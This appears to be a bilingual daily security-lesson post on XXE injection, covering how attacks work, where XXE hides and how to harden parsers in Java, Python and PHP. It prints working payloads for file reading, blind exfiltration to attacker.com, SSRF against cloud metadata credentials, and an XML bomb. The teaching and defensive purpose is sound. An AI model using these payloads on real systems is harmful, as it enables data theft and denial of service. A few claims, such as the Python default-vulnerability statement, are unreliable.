---
title: "Day 25 — XXE Injection: When XML Becomes a Weapon"
date: 2026-09-08
tags:
  - daily
  - security
  - english
description: "In 2014, a researcher discovered that Facebook （脸书） had a vulnerability related to XML External Entity XXE processing in one of its internal services."
---

**Date:** 2026-09-08 | **Difficulty:** ★★★☆☆ Technical | **Source:** OWASP Top 10:2021 A05 / PortSwigger Web Security Academy | **Link:** [OWASP A05:2021 — Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/), [PortSwigger XXE](https://portswigger.net/web-security/xxe)

---

## Why This Matters

In 2014, a researcher discovered that **Facebook** （脸书） had a vulnerability related to **XML External Entity (XXE)** processing in one of its internal services. The service parsed **XML** （可扩展标记语言） feeds from third-party sources, and because the **XML parser** （XML 解析器） was configured with default settings, it would resolve external entities — resolving file paths on the server and sending their contents back to the attacker. Facebook was fortunate: the issue was found during a **bug bounty** （漏洞赏金） program before any real exploitation.

XXE is not always this lucky. In many engagements, testers have used XXE to read `/etc/passwd`, retrieve cloud **metadata service** （元数据服务） credentials via SSRF, or even trigger **Out-of-Band (OOB)** （带外通信） data exfiltration when the application does not return parsed content directly.

> XXE 的杀伤面比想象中大：不仅能读文件，还能发起 SSRF 攻击内网、窃取云凭据，甚至做 DoS。

---

## What Is XXE Injection?

**XML External Entity (XXE) Injection** is a vulnerability that exploits how XML parsers handle **DTD** （Document Type Definition，文档类型定义） and **external entities** （外部实体）. When an application accepts XML input and parses it with a parser that resolves external entities, an attacker can define a custom entity pointing to a local file, a network endpoint, or a malicious payload, and trick the parser into resolving it.

A basic XML document with a malicious entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

When the parser encounters `&xxe;`, it resolves the entity by reading `/etc/passwd` from the filesystem. If the application includes the parsed content in its response, the attacker sees the file contents directly — this is called **classic XXE** （经典 XXE）.

> 一个 `&xxe;` 引用就能让服务器把本地文件内容返回给攻击者——这就是 XXE 最基本的攻击链。

---

## The XML Entity System: A Quick Primer

To understand why XXE exists, you need to understand how XML entities work:

| Concept | Chinese | Description |
|---------|---------|-------------|
| XML | 可扩展标记语言 | A markup language designed for data interchange |
| DTD (Document Type Definition) | 文档类型定义 | Defines the structure and entities of an XML document |
| Internal Entity | 内部实体 | Defined within the DTD itself, e.g. `<!ENTITY name "value">` |
| External Entity | 外部实体 | References an external resource via URL, e.g. `<!ENTITY name SYSTEM "file:///etc/passwd">` |
| Parameter Entity | 参数实体 | A special entity used inside the DTD itself, prefixed with `%` |
| Entity Expansion | 实体展开 | The process of resolving entity references to their values |

The core problem: **XML parsers are designed to resolve entities by default.** This was a design choice from the 1990s when XML was meant for document publishing. In modern web applications, this feature is almost never needed — yet many parsers still enable it unless explicitly disabled.

> XML 实体解析是 90 年代文档场景的设计遗产，在今天的 Web 应用中几乎无人使用，却默认开启，这就是漏洞的根源。

---

## Types of XXE Attacks

### 1. Classic XXE (In-Band)

The simplest form: the application parses XML and reflects the parsed content back in its response. The attacker defines an entity pointing to a sensitive file, and the file contents appear in the HTTP response.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///c:/windows/win.ini">
]>
<data>&file;</data>
```

If the application echoes the `<data>` element, the attacker sees `win.ini` contents.

### 2. Blind XXE (Out-of-Band)

When the application does not return parsed XML content in the response, the attacker uses **Out-of-Band data exfiltration** （带外数据外泄） — directing the parser to fetch a resource from an attacker-controlled server, embedding sensitive file contents in the URL or POST body.

The attacker first defines an external DTD on their own server:

```xml
<!-- attacker.dtd (hosted at http://attacker.com/evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

Then the attacker sends this XML to the target:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
<data>test</data>
```

The parser loads the external DTD from the attacker's server, which instructs the parser to read `/etc/passwd` and send its contents as a URL parameter to `attacker.com`. The attacker monitors their server logs to collect the exfiltrated data.

> 盲 XXE 利用参数实体和外部 DTD 的组合，把文件内容通过 HTTP 请求"带外"传到攻击者服务器——应用本身看不到任何异常。

### 3. XXE for SSRF

An external entity can reference a URL instead of a file, turning XXE into a **Server-Side Request Forgery (SSRF)** vector:

```xml
<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

This forces the parser to send an HTTP request to the cloud metadata endpoint, potentially leaking **IAM credentials** （IAM 凭据）. This is especially dangerous in **AWS EC2** （亚马逊弹性计算云） environments where the **Instance Metadata Service (IMDS)** provides temporary credentials.

### 4. Billion Laughs Attack (Entity Expansion DoS)

Also known as **XML Bomb** （XML 炸弹）, this attack uses nested entity definitions to create exponential memory consumption:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

A few kilobytes of XML expand into gigabytes in memory, causing **Denial of Service (DoS)** （拒绝服务）. The original "Billion Laughs" attack produced ~3 GB of memory usage from a 1 KB payload.

> XML 炸弹不需要外部连接，仅靠嵌套实体展开就能把服务器内存耗尽——这是一种纯本地 DoS。

---

## Where XXE Hides in Modern Applications

XXE is often associated with **SOAP** （简单对象访问协议） web services, but it appears in many other places:

| Entry Point | Why It's Vulnerable | Common Technologies |
|-------------|---------------------|----------------------|
| SOAP API endpoints | SOAP messages are XML by definition | Java EE, .NET SOAP services |
| RSS / Atom feed parsers | Feeds are XML and may be user-supplied | Feed aggregators, CMS plugins |
| SVG image upload | SVG is XML; parsers may process entities | Image processing libraries |
| Office document import | `.docx`, `.xlsx`, `.odt` are ZIP-wrapped XML | Document conversion services |
| SAML SSO responses | SAML assertions are XML signed and parsed | Identity providers, SP modules |
| Custom XML APIs | Developer-built REST APIs accepting `application/xml` | Any language/framework |

The **SAML SSO** case is particularly dangerous: a malicious **Identity Provider (IdP)** （身份提供者） or a crafted assertion can trigger XXE in the **Service Provider (SP)** （服务提供者）, potentially leaking the signing key or internal configuration.

> XXE 不只存在于 SOAP：SVG 上传、Office 导入、SAML 登录——凡是解析 XML 的入口都可能是攻击面。

---

## Defense: Disabling External Entity Resolution

### Java

Java has the most XXE-vulnerable parsers because many default configurations enable entity resolution. The fix depends on the parser:

```java
// DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

For **SAXParser**:
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

> Java 的 `disallow-doctype-decl` 是最彻底的防护：直接禁止 DTD 声明，从源头消除 XXE。

### Python

Python's `xml.etree.ElementTree` is vulnerable by default since version 3.7.2+. Use `defusedxml` instead:

```python
# pip install defusedxml
import defusedxml.ElementTree as ET

# This will reject entities and DTDs by default
tree = ET.parse("user_input.xml")
```

For `lxml`, configure explicitly:
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

### PHP

PHP's `libxml` extension disables external entity loading by default since PHP 8.0. For older versions:

```php
libxml_disable_entity_loader(true);
```

> `defusedxml` 是 Python 的事实标准——一行替换即可免疫绝大多数 XXE。

### General Hardening Checklist

1. **Disable DTD processing** entirely if your application does not need it — this is the strongest defense.
2. **Disable external general and parameter entities** if DTD is required.
3. **Disable XInclude** to prevent inclusion of external documents.
4. **Set `no_network=True`** or equivalent to prevent the parser from making outbound HTTP requests.
5. **Limit entity expansion depth and total entity count** to prevent XML Bomb attacks.
6. **Validate XML against a schema (XSD)** before parsing to reject unexpected structure.
7. **Monitor parser error messages** — verbose errors may leak file paths or internal details.

> 最优解是禁止 DTD，其次禁用外部实体解析；两者都不做，等于默认信任用户输入。

---

## Detection and Monitoring

For defenders, XXE has a relatively clear **indicator of compromise (IoC)** （入侵指标） signature:

| Detection Layer | Signal | Tool |
|-----------------|--------|------|
| WAF | DTD declarations in HTTP body with `<!ENTITY` and `SYSTEM` | ModSecurity, Cloud WAF |
| SIEM | Outbound HTTP from app servers to unexpected external IPs | SIEM / NetFlow analysis |
| EDR | Web server process making unexpected file reads (e.g., `/etc/passwd`) | EDR file access monitoring |
| Parser logs | Entity resolution errors or warnings in application logs | Application-level logging |

The most reliable detection: **a web application making outbound HTTP requests to external IPs is almost always suspicious** — XXE SSRF is one of the few scenarios where this happens legitimately.

> 检测 XXE 的核心信号：web 进程突然发起对内网元数据 IP 或外部 IP 的 HTTP 请求。

---

## Key Terms

| English | 中文 | Notes |
|---------|------|-------|
| XML (eXtensible Markup Language) | 可扩展标记语言 | 用于数据交换的标记语言 |
| XXE (XML External Entity) | XML 外部实体注入 | 利用 XML 解析器解析外部实体时的漏洞 |
| DTD (Document Type Definition) | 文档类型定义 | 定义 XML 文档结构和实体的规则集 |
| External Entity | 外部实体 | 引用外部资源的实体，如文件或 URL |
| Parameter Entity | 参数实体 | 仅在 DTD 内部使用的实体，以 `%` 开头 |
| Entity Expansion | 实体展开 | 解析器将实体引用替换为其值的过程 |
| Classic XXE | 经典 XXE | 解析内容直接返回到 HTTP 响应中的 XXE |
| Blind XXE | 盲 XXE | 解析内容不返回，需通过带外通信外泄数据 |
| Out-of-Band (OOB) | 带外通信 | 通过与目标服务不同的通道传输数据 |
| XML Bomb | XML 炸弹 | 利用嵌套实体展开造成内存耗尽的 DoS 攻击 |
| SSRF (Server-Side Request Forgery) | 服务端请求伪造 | 利用 XXE 发起服务端 HTTP 请求攻击内网 |
| SOAP (Simple Object Access Protocol) | 简单对象访问协议 | 基于 XML 的 Web 服务协议 |
| SAML (Security Assertion Markup Language) | 安全断言标记语言 | 用于 SSO 的 XML 标准 |
| IAM Credentials | IAM 凭据 | 云平台身份与访问管理的临时凭证 |
| IoC (Indicator of Compromise) | 入侵指标 | 用于检测入侵活动的特征或证据 |
| Disallow Doctype Decl | 禁止 DTD 声明 | 解析器特性，从源头消除 XXE 攻击面 |

---

## 甲方视角思考

1. **凡是接收 XML 输入的接口都是攻击面** — SOAP API、SAML SSO、SVG 上传、Office 导入、RSS 订阅解析，都需要逐一确认 XML 解析器是否禁用了外部实体。
2. **出站流量监控是 XXE 最有效的检测层** — web 应用服务器不应该主动发起对内网元数据 IP（如 169.254.169.254）或外部未知 IP 的 HTTP 请求，出现即告警。
3. **Java 项目是 XXE 重灾区** — Java 历史上默认开启实体解析的 parser 最多，审计 Java 项目时优先检查 `DocumentBuilderFactory`、`SAXParser`、`XMLReader` 的初始化配置。
4. **升级到 PHP 8+ 或使用 defusedxml 是最低成本修复** — 如果架构允许，直接迁移到默认禁用实体解析的语言版本，比逐个接口修改配置更可靠。

---

## Tomorrow — Day 26 Preview

**Business Logic Vulnerabilities** — we will shift from injection-class flaws to logic errors: how attackers exploit rate-limit absence, negative quantity purchases, coupon stacking, and race conditions in financial transactions. These bugs cannot be found by scanners — only by thinking like an attacker. Difficulty remains ★★★☆☆.
